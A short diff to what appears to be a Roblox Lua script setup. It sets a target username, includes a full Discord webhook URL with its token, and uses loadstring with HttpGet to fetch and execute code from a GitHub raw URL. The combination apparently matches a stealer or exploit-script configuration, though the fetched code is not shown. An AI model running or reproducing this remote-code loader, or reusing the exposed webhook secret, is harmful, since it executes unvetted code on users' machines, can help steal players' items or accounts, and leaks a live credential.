@@ -1,5 +1,5 @@
-Username= 'daviblazer01'
+Username= 'your mom'
 Webhook= 'https://discord.com/api/webhooks/1264529674919219291/lavko-IGeK7w0ENRMxO0SHLcOumtdAJajvxyyqJAGaAVEBeMTyIVMokZ9F2y_ANUHuY4'
 
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/NzxCrab-wq/OrionLibrary/main/NzxCrab'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NzxCrab-wq/OrionLibrary/main/NzxCrab"))()
